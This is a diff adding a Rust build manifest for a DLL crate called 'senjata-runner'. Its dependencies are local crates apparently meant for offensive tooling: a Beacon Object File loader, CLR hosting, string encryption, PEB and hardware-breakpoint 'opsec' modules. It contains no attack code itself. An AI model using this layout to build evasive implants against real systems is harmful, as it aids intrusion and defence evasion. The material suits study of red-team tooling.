@@ -1,0 +1,32 @@
+[package]
+name = "senjata-runner"
+version.workspace = true
+edition.workspace = true
+
+[lib]
+crate-type = ["cdylib"]
+
+[dependencies]
+rustbof = { path = "../../crates/rustbof" }
+clr-orchestrator = { path = "../../crates/clr-orchestrator" }
+opsec-strcrypt = { path = "../../crates/opsec-strcrypt" }
+opsec-strcrypt-rt = { path = "../../crates/opsec-strcrypt-rt" }
+opsec-peb = { path = "../../crates/opsec-peb" }
+opsec-bootstrap = { path = "../../crates/opsec-bootstrap" }
+opsec-hwbp = { path = "../../crates/opsec-hwbp" }
+opsec-com = { path = "../../crates/opsec-com" }
+
+[dependencies.windows-sys]
+workspace = true
+features = [
+    "Win32_Foundation",
+    "Win32_Storage_FileSystem",
+    "Win32_System_LibraryLoader",
+    "Win32_System_SystemServices",
+    "Win32_System_Threading",
+    "Win32_System_IO",
+    "Win32_System_Pipes",
+]
+
+[lints]
+workspace = true
